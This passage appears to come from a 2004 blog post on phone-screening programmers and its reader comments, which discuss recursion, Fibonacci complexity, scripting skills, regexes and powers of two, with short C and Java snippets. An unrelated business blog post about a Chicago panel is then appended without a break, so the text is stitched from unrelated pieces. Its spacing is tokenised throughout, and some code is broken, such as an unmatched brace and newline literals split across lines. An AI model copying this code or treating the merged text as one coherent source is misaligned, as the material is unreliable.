And , uh , double .

No , just vi .
Always worked just fine for me .
Translation : " Sometimes I type with my elbows when my hands are tired .

Probable failure modes for this candidate :
Will likely fail the HTML - phone - number question .
Might pass the interviews , but will need to be scheduled in geologic eras .
Bad Sign # 5 : Me : So !
What did you study in your Operating Systems class ?
Them :
Oh , that was a long time ago .
I can hardly remember .
Hehe .
Me : How long ago was it ?
Them : 2 years .
Translation : " I want to use my MBA skills in a dynamic management role .
When 's lunch ? "
Probable failure modes for this candidate :
Will probably fail the coding question .
Probably any OS questions , too .
All my Insta-Bad Signs above are cliches , in that I 've heard these answers from at least 10 to 15 candidates ( per question ! ) , none of whom ever got an offer from us .
I tend to ask questions like these as a matter of course now .
Summary
This stuff is the ABC 's for programmers .
Actually it 's only going up through maybe J or K ; it 's not even halfway through the alphabet .
But most programmers out there in the Big Wide World will fail utterly in at least one of these areas .
Please cover all five areas if you 're a phone screener .
If you 're the second screener , ask if you do n't see evidence of them in the first screener 's notes .
( And then follow up and remind the first screener they should have asked these things . )
( Published Sep 28th 2004 ) Comments
You can put a spin on your ' reverse a string ' coding question - first have them write a func that prints out a C string without looping constructs or using local vars .
Then if they get that , ask them to implement a reverse string function in the same manner as the first one .
Do n't say " use recursion " - let them figure out its straightforward applicability to the problem .
That 's , IMHO , how you can gauge if they ' think recursively ' when lightly nudged in that direction : void print ( char *s ) {
if (*s != 0 ) {
putchar (*s ) ;
print( s+1 ) ;
}
}
void printreverse ( char *s ) {
if (*s != 0 )
printreverse( s+1 ) ;
putchar (*s ) ;
}
}
int main ( ) {
char *s = " Hello world " ;
print(s ) ;
putchar ( '
' ) ;
printreverse(s ) ;
putchar ( '
' ) ;

Nice post Steve - thanks for the checklist .
Would you really accept this answer to the ' Write function to compute Nth fibonacci number ' question ?
static long fib( int n ) {
return n <= 1 ? n : fib( n - 1 ) + fib ( n - 2 ) ;
} I 'd hope that most candidates would know that ( without memoization of results ) the naive recursive solution is O ( n ! ) in time .
If they made that error in production code it would be and utter disaster ( probably large enough to be noticed early by QA , but still ... ) .
If the candidate did n't at least mention this caveat about their solution , I 'd prompt them to compare & contrast with alternatives .
If they did n't immediately give the iterative solution and explain the big- O difference , that would be a red flag for me .
regards , Chris Posted by : Chris N. at September 29 , 2004 08:36 PM
Er , a small error in my comment : >>>
I 'd hope that most candidates would know that ( without memoization of results ) the naive recursive solution is O ( n ! ) in time .
I meant " is O ( 2 ^n ) in time " of course .
Chris ( blushing ) Posted by : Chris N. at September 29 , 2004 08:39 PM
Yeah , that factorial fibo solution sucks .
I 'd be very happy if the candidate told me that they could do it tail - recursively with an accumulator parameter , even if I 'm not sure you can do a doubly - recursive call tail - recursively .
I 'd still be happy .
I was thinking of splitting out recursion from basic coding , but that would be Six Essential Areas , and I only have five fingers .
Posted by : Steve Yegge at September 30 , 2004 03:42 AM
Interesting post overall ... a couple of comments / issues I 've seen when doing phone screens : 1 . How do you have a candidate read code to you over the phone when the candidate is n't a native English speaker and the phone connection is sub-optimal [ I 've had this more times than I can remember ...]
2 . I have some issues with the " scripting " category -- it expresses a preference for hacky programmers who prefer speed over maintainability .
On our team ( Customer Behavior ) we 're still cleaning up a fair amount of such code that broke the moment a database machine got moved between data centers .
Yes , the code was written quickly , but now our managers are wondering why we can't get to a stable production system so quickly .
The section also prefers UNIX programmers over , say , people who worked with Windows for an entire career .

Me too .
The best approach I 've seen is to give the candidate a " homework " question .
Give them an hour to code up a solution to some problem and email it to you .
Several teams are doing this regularly , with good results . >
2 . I have some issues with the " scripting " category -- it
> expresses a preference for hacky programmers who prefer speed
> over maintainability .
I 'm sorry if I gave that impression .
We do n't want those kinds of programmers here , obviously .
The five question areas here are a delicate balance .
This category is geared towards determining whether someone has the self - sufficiency to be able to respond quickly to emergencies affecting our customers .
They still need to have good judgement and good design skills .
I never actually specify that they need to write it as a script .
I just give them problems that are best handled that way : emergency queries and backfills , for example .
I 've had a few folks burn through 200 - line Java or C++ apps that solved the problem , right there on the board , and they got offers .
But after 4 1/2 years over in Customer Service , I 've found that knowing how to use " grep " and its ilk is a pretty important survival skill .
And we - are - Unix shop , after all .
Unix is n't exactly a niche operating system .
There are people who 've figured out the basics on their own , even if their professional experience has all been with Microsoft technologies .
But feel free to ask whatever works for you !
Posted by : Steve Yegge at October 7 , 2004 02:27 AM
The ultra-cool solution to Fib is the closed - form constant time solution .
You need floating point and exponentiation , but that 's constant time on modern hardware .
There 's also an off - by - one error of sorts in your printOdds ( ) functions .
i should start at 1 , not 0 , or the function should be renamed printEvens ( ) .
Posted by : Darren V. at October 7 , 2004 02:42 AM
Thanks Darren .
Obviously extra-cool solutions are bonus points for the candidate .
Fixed the loop typo .
It was caused , interestingly , when I corrected my original working code , after someone emailed me and complained about the performance .
Originally it did this : for ( int i = 0 ; i < 100 ; i++ ) {
if ( i % 2 != 0 ) System.out.println(i ) ;
} The point was to see if the candidate could write something that worked at all , and I was whipping up examples at 3:00 am .
Had no idea it would get so much attention .
In any case , someone objected to the fact that it was n't simply incrementing the loop counter by 2 , so it performed poorly .
So I went and " optimized " it ( an optimization that would go undetected by humans or profilers in this case , as it's totally I /O bound ) , and in my haste , broke it .
I suppose I should claim that I rigged the whole thing as a demonstration of why optimizing stuff that does n't matter is needlessly risky .
Or that I broke it so I could rant about why unit testing is critical , even for your personal blog content .
But really I just made a bad fix . :)
Thanks again .

Thanks for posting this .
I have been trying to improve my interviewing skills , and this looks like a good set of basics for phone screens .
Posted by : Timothy K. at October 11 , 2004 11:20 PM
Just an FYI ...
I tried using the find - the - phone - numbers question on a candidate yesterday , and she went straight for Java .
I was getting ready to slap her down when I noticed that Java 1.4 contains a regular expression engine .
With that enhancement , the write - a- complete - program solution becomes more reasonable .
Posted by : Christopher B. at November 17 , 2004 09:37 AM
Yep .
Most languages these days have ( mostly ) Perl5 compatible regexp engines .
Java 's file handling is a bit more cumbersome than it'd be in a scripting language , but not overly so .
The problem is more about understanding fundamental pattern - matching tools than it is about scripting or any particular language .
Posted by : Steve Yegge at November 29 , 2004 06:52 PM
I 'm about to do my first phone screening and this was very helpful .
Maybe I just do n't want to admit that I do n't have vital information , but I do n't know what 2^16 is .
Jeff Bezos ' phone number ?
I do n't understand the significance of knowing powers of two off the top of one 's head .
Posted by : Jason R. at March 22 , 2005 10:58 PM
Jason : there are many domains for which knowing binary counting is useful , if not essential .
One is when you 're doing stuff that involves a lot of bit - and byte - manipulation ; examples include network protocols , writing binary serialization / marshalling code , and reading or reverse - engineering file formats .
Another is when you 're doing any sort of memory or pointer coding ( or more to the point , debugging ) with C/ C++ code .
It 's a lot easier to stare at hex - dumps if you 're good at translating between decimal and hexadecimal ( and binary ) .
Another broad class of problems involves data whose byte representation is especially significant .
UTF - 8 and Unicode are good examples .
If you ever need to do internationalization , it can be a big help to have a crystal - clear understanding of the meaning of each bit in a byte , short , or int / word value .
Actually , this may just be another sub -example of the first domain I mentioned , but you get the idea .
Lastly ( and most importantly ; all the other examples I 've listed pale to insignificance in comparison to this one ) , it 's important for algorithm time and space estimation .
If you 're trying to decide what data structure to use for a given data set , and you know off the top of your head that 2^16 is about 65,000 , 2^20 is a million , 2^32 is 4 billion , and 2^64 is " big enough " , then you 'll have an easier time with the decision .
Looking at it backwards -- if you use a balanced binary tree ( or a log -n search algorithm ) , you can quickly estimate the base - 2 logarithm of your data - set size , which gives you the rough number of steps involved in a lookup operation .
If you do n't have a good feel for the growth rate of powers of 2 , then a little old man will save your daughter , and you 'll grant him anything you want in your kingdom , and he 'll say he just wants one grain of rice on the first square of a chessboard , then 2 in the second , 4 on the third , and so on .
And then : you 'll be all out of rice .
Fortunately , you can memorize this stuff in less time than it took you to post your comment . :)
Posted by : Steve Yegge at March 23 , 2005 04:11 AM
This is an * excellent * resource , Steve .
I 've noticed that a lot of the Java - steeped interviewees will use Strings in their string reverse solutions like so : for ( int i = s.length - 1 ; i >= 0 ; i--) {
returnS += s.substring(i , 1 ) ;
} Most will understand that objects are being allocated and discarded per loop , and will use a StringBuffer to make things " more efficient " .
Interestingly , a couple of folks could n't explain _why_ it would be more efficient .
It 's helpful to ask how they would design a limited StringBuffer class using just primitive types to try to help dispel library addiction .
It can be surprisingly intimidating for some folks , especially when it comes to reallocating arrays .
( Ironic , considering the allocation - fest of their original solutions ... )
Thus , I recommend it as another coding question -- though just to talk through , not to code over the phone .
Alternatively , asking for the reverse ( ) function using just primitives would do the same thing , but without the scariness of dreaded reallocation .

Most businesses self destruct Jason 13 comments Latest by John
A few weeks back I was invited to speak at a TiE Event here in Chicago .
The panel included Lucas Roh , CEO of Hostway , Mike Domeck , CEO of Ticketsnow , and mysef .
It was moderated by Matt McCall of Portage Ventures .
I really enjoyed being on the panel and learning from the other panelists .
We all have different backgrounds , different businesses , and different ways of running our businesses .
Lucas and Mike are sharp .
Out of everything that was said , one thing really stuck with me .
When Lucas was asked how he deals with the heated competition in the web hosting space , he said , and I ’m partially - paraphrasing , “ We just do what we do best .
We focus on our business , our customers , and our vision .
Most businesses self destruct anyway so we just make sure ours does n’t .
Focusing too much on what everyone else is doing is a sure way to run your own business out of control . ”
I really loved that .
He ’s spot on .
Most businesses self destruct anyway .
They focus on the wrong things , they chase the wrong ideas , they fight the “ more more more ” cold war .
The only company that wins the cold war is the one with the most resources .
Everyone else loses .
Who wants to fight that war ?
Kathy Sierra touched on this a few days ago .
Yes , you have to pay attention to what ’s going on out there , but I ’d argue you need to pay more attention to what ’s going on in here .
In your own company .
In your own products .
In yourself and your own vision .
Are you delivering your products or your competition ’s products with a different coat of paint ?
Believe in what you ’re doing , deliver on that vision , and chart your own course .
Do n’t worry too much about everyone else .
Be a great chef and deliver your own signature dishes — do n’t just deliver another burger .
Maybe you ’ll be right , maybe you ’ll be wrong , but it ’s certainly a lot more satisfying than losing the expensive , frustrating , dangerous cold war .
